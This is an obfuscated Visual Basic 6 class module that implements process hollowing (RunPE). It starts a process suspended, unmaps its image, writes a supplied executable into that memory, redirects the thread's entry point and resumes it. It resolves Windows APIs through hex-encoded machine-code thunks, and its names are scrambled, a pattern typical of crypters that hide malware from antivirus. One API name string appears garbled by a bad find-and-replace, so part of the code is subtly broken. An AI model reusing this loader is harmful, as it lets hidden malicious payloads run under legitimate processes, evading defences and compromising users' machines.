VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Private Const sConst001       As Long = &H5A4D&
Private Const sConst002        As Long = &H4550&

Private Const sConst003           As Long = &H40
Private Const sConst004           As Long = &HF8
Private Const sConst005     As Long = &H28
Private Const sConst006 As Long = &H28

Private Const sConst011              As Long = &H10007
Private Const sConst012          As Long = &H4
Private Const sConst013                As Long = &H1000
Private Const sConst014               As Long = &H2000
Private Const sConst015    As Long = &H40

Private Type sType001
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type sType002
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type sType003
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type sType004
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As sType003
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type sType005
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type sType006
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type sType007
    VirtualAddress              As Long
    Size                        As Long
End Type

Private Type sType008
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfsFunction09Data       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As sType007
End Type

Private Type sType009
    Signature                   As Long
    FileHeader                  As sType006
    OptionalHeader              As sType008
End Type

Private Type sType010
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type sType011
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type


Private Declare Sub e4j8c5PCdAMaIZLPodaU Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)


Private inject_var001         As Long
Private inject_var002      As Long
Private inject_var003         As Boolean
Private inject_var004          As Long
Private inject_var005       As Long
Private inject_var006(&HFF)   As Byte
        
Public Function sFunction01() As Long
    'This function will be replaced with machine code laterz
    'Do not add any public procedure on top of it
End Function

Public Function sFunction02(ByRef bvBuff() As Byte, Optional sHost As String) As Boolean
On Error Resume Next
    Dim i                       As Long
    Dim tIMAGE_DOS_HEADER       As sType005
    Dim tIMAGE_NT_HEADERS       As sType009
    Dim tIMAGE_SECTION_HEADER   As sType011
    Dim tSTARTUPINFO            As sType001
    Dim tPROCESS_INFORMATION    As sType002
    Dim tCONTEXT                As sType004
    Dim lKernel                 As Long
    Dim lNTDll                  As Long
    Dim lMod                    As Long
    
    If Not inject_var003 Then Exit Function

    Call e4j8c5PCdAMaIZLPodaU(tIMAGE_DOS_HEADER, bvBuff(0), sConst003)
    
    If Not tIMAGE_DOS_HEADER.e_magic = sConst001 Then
        Exit Function
    End If

    Call e4j8c5PCdAMaIZLPodaU(tIMAGE_NT_HEADERS, bvBuff(tIMAGE_DOS_HEADER.e_lfanew), sConst004)
    
    If Not tIMAGE_NT_HEADERS.Signature = sConst002 Then
        Exit Function
    End If
    
    lKernel = sFunction08("kernel32")
    lNTDll = sFunction08("ntdll")
    
    If sHost = vbNullString Then
        sHost = Space(260)
        lMod = sFunction10(lKernel, "sFunction07uleFileNameW")
        sFunction03 lMod, App.hInstance, StrPtr(sHost), 260
    End If
    
    With tIMAGE_NT_HEADERS.OptionalHeader
        
        tSTARTUPINFO.cb = Len(tSTARTUPINFO)
            
        lMod = sFunction10(lKernel, "CreateProcessW")
        sFunction03 lMod, 0, StrPtr(sHost), 0, 0, 0, sConst012, 0, 0, VarPtr(tSTARTUPINFO), VarPtr(tPROCESS_INFORMATION)

        lMod = sFunction10(lNTDll, "NtUnmapViewOfSection")
        sFunction03 lMod, tPROCESS_INFORMATION.hProcess, .ImageBase
        
        lMod = sFunction10(lKernel, "VirtualAllocEx")
        sFunction03 lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, .SizeOfImage, sConst013 Or sConst014, sConst015
        
        lMod = sFunction10(lKernel, "WriteProcessMemory")
        sFunction03 lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, VarPtr(bvBuff(0)), .SizeOfHeaders, 0
    
        For i = 0 To tIMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1
            e4j8c5PCdAMaIZLPodaU tIMAGE_SECTION_HEADER, bvBuff(tIMAGE_DOS_HEADER.e_lfanew + sConst004 + sConst006 * i), Len(tIMAGE_SECTION_HEADER)
            sFunction03 lMod, tPROCESS_INFORMATION.hProcess, .ImageBase + tIMAGE_SECTION_HEADER.VirtualAddress, VarPtr(bvBuff(tIMAGE_SECTION_HEADER.PointerToRawData)), tIMAGE_SECTION_HEADER.SizeOfRawData, 0
        Next i

        tCONTEXT.ContextFlags = sConst011
        
        lMod = sFunction10(lNTDll, "NtGetContextThread")
        sFunction03 lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
    
        lMod = sFunction10(lKernel, "WriteProcessMemory")
        sFunction03 lMod, tPROCESS_INFORMATION.hProcess, tCONTEXT.Ebx + 8, VarPtr(.ImageBase), 4, 0
       
        tCONTEXT.Eax = .ImageBase + .AddressOfEntryPoint
        
        lMod = sFunction10(lNTDll, "NtSetContextThread")
        sFunction03 lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
        
        lMod = sFunction10(lNTDll, "NtResumeThread")
        sFunction03 lMod, tPROCESS_INFORMATION.hThread, 0
    End With
    
    sFunction02 = True
    
End Function

Public Function sFunction03(ByVal lMod As Long, ParamArray Params()) As Long

    Dim lPtr        As Long
    Dim i           As Long
    Dim sData       As String
    Dim sParams     As String
    
    If lMod = 0 Then Exit Function
    
    For i = UBound(Params) To 0 Step -1
        sParams = sParams & "68" & sFunction04(CLng(Params(i)))
    Next
    
    lPtr = VarPtr(inject_var006(0))
    lPtr = lPtr + (UBound(Params) + 2) * 5
    lPtr = lMod - lPtr - 5
    
    sData = "8B4C240851<MGsSSHF25S>E8<BSK94SK42G>5989016631C0C3"
    sData = Replace(sData, "<MGsSSHF25S>", sParams)
    sData = Replace(sData, "<BSK94SK42G>", sFunction04(lPtr))
    
    Call sFunction05(sData)
    
    sFunction03 = sFunction06
End Function

Private Function sFunction04(ByVal lData As Long) As String
    Dim bvTemp(3)   As Byte
    Dim i           As Long
    
    e4j8c5PCdAMaIZLPodaU bvTemp(0), lData, &H4
    For i = 0 To 3
        sFunction04 = sFunction04 & Right("0" & Hex(bvTemp(i)), 2)
    Next
End Function

Private Sub sFunction05(ByVal sThunk As String)
    Dim i   As Long
    For i = 0 To Len(sThunk) - 1 Step 2
        inject_var006((i / 2)) = CByte("&h" & Mid$(sThunk, i + 1, 2))
    Next
End Sub

Private Function sFunction06() As Long
    e4j8c5PCdAMaIZLPodaU inject_var004, ByVal ObjPtr(Me), &H4
    inject_var004 = inject_var004 + &H1C
    e4j8c5PCdAMaIZLPodaU inject_var005, ByVal inject_var004, &H4
    e4j8c5PCdAMaIZLPodaU ByVal inject_var004, VarPtr(inject_var006(0)), &H4
    sFunction06 = sFunction01
    e4j8c5PCdAMaIZLPodaU ByVal inject_var004, inject_var005, &H4
End Function

Public Function sFunction07(ByVal sLib As String, ByVal sProc As String) As Long
    sFunction07 = Me.sFunction10(Me.sFunction08(sLib), sProc)
End Function

Public Function sFunction08(ByVal sLib As String) As Long
    sFunction08 = sFunction03(inject_var002, StrPtr(sLib & vbNullChar))
End Function

Public Property Get sFunction09() As Boolean
    sFunction09 = inject_var003
End Property

Public Sub Class_Initialize()

    Call sFunction05("8B4C2408565531C0648B70308B760C8B761C8B6E088B7E208B3638471875F3803F6B7407803F4B7402EBE789295D5EC3")
    
    inject_var001 = sFunction06
    
    If Not inject_var001 = 0 Then
        inject_var002 = sFunction10(inject_var001, "LoadLibraryW")
        If Not inject_var002 = 0 Then
            inject_var003 = True
        End If
    End If
End Sub

Public Function sFunction10(ByVal lMod As Long, ByVal sProc As String) As Long
    Dim tIMAGE_DOS_HEADER       As sType005
    Dim tIMAGE_NT_HEADERS       As sType009
    Dim tIMAGE_EXPORT_DIRECTORY As sType010
    
    Call e4j8c5PCdAMaIZLPodaU(tIMAGE_DOS_HEADER, ByVal lMod, sConst003)
    
    If Not tIMAGE_DOS_HEADER.e_magic = sConst001 Then
        Exit Function
    End If

    Call e4j8c5PCdAMaIZLPodaU(tIMAGE_NT_HEADERS, ByVal lMod + tIMAGE_DOS_HEADER.e_lfanew, sConst004)
    
    If Not tIMAGE_NT_HEADERS.Signature = sConst002 Then
        Exit Function
    End If
    
    Dim lVAddress   As Long
    Dim lVSize      As Long
    Dim lBase       As Long
    
    With tIMAGE_NT_HEADERS.OptionalHeader
        lVAddress = lMod + .DataDirectory(0).VirtualAddress
        lVSize = lVAddress + .DataDirectory(0).Size
        lBase = .ImageBase
    End With
    
    Call e4j8c5PCdAMaIZLPodaU(tIMAGE_EXPORT_DIRECTORY, ByVal lVAddress, sConst005)
       
    Dim i           As Long
    Dim lFunctAdd   As Long
    Dim lNameAdd    As Long
    Dim lNumbAdd    As Long

    With tIMAGE_EXPORT_DIRECTORY
        For i = 0 To .NumberOfNames - 1
           
            e4j8c5PCdAMaIZLPodaU lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4, 4
            
            If sFunction12(lBase + lNameAdd) = sProc Then
                e4j8c5PCdAMaIZLPodaU lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2, 2
                e4j8c5PCdAMaIZLPodaU lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4, 4
                
                sFunction10 = lFunctAdd + lBase
                             
                If sFunction10 >= lVAddress And sFunction10 <= lVSize Then
                    Call sFunction11(sFunction10, lMod, sProc)
                    If Not lMod = 0 Then
                        sFunction10 = sFunction10(lMod, sProc)
                    Else
                        sFunction10 = 0
                    End If
                End If
                
                Exit Function
            End If
        Next
    End With
    
End Function

Private Function sFunction11(ByVal lAddress As Long, ByRef lLib As Long, ByRef sMod As String)
    Dim sForward     As String
    
    sForward = sFunction12(lAddress)
    If InStr(1, sForward, ".") Then
        lLib = sFunction08(SplitAlter(sForward, ".")(0))
        sMod = SplitAlter(sForward, ".")(1)
    End If
    
End Function

Private Function sFunction12(ByVal lAddress As Long) As String
       
    Dim bChar       As Byte
    
    Do
        e4j8c5PCdAMaIZLPodaU bChar, ByVal lAddress, 1
        lAddress = lAddress + 1
        If bChar = 0 Then Exit Do
        sFunction12 = sFunction12 & Chr$(bChar)
    Loop
    
End Function

Private Function SplitAlter(ByVal Expression As String, Optional ByVal Delimiter As String, Optional ByVal Limit As Long = -1) As String()
    Dim lLastPos    As Long
    Dim lIncrement  As Long
    Dim lExpLen     As Long
    Dim lDelimLen   As Long
    Dim lUbound     As Long
    Dim svTemp()    As String
   
    lExpLen = Len(Expression)
   
    If Delimiter = vbNullString Then Delimiter = " "
    lDelimLen = Len(Delimiter)
    If Limit = 0 Then GoTo QuitHere
    If lExpLen = 0 Then GoTo QuitHere
    If InStr(1, Expression, Delimiter, vbBinaryCompare) = 0 Then GoTo QuitHere
   
    ReDim svTemp(0)
    lLastPos = 1
    lIncrement = 1
   
    Do
        If lUbound + 1 = Limit Then
            svTemp(lUbound) = Mid$(Expression, lLastPos)
            Exit Do
        End If
        lIncrement = InStr(lIncrement, Expression, Delimiter, vbBinaryCompare)
        If lIncrement = 0 Then
            If Not lLastPos = lExpLen Then
                svTemp(lUbound) = Mid$(Expression, lLastPos)
            End If
            Exit Do
        End If
        svTemp(lUbound) = Mid$(Expression, lLastPos, lIncrement - lLastPos)
        lUbound = lUbound + 1
        ReDim Preserve svTemp(lUbound)
        lLastPos = lIncrement + lDelimLen
        lIncrement = lLastPos
    Loop
   
    ReDim Preserve svTemp(lUbound)
    SplitAlter = svTemp
   
    Exit Function
   
QuitHere:
    ReDim SplitAlter(-1 To -1)
End Function



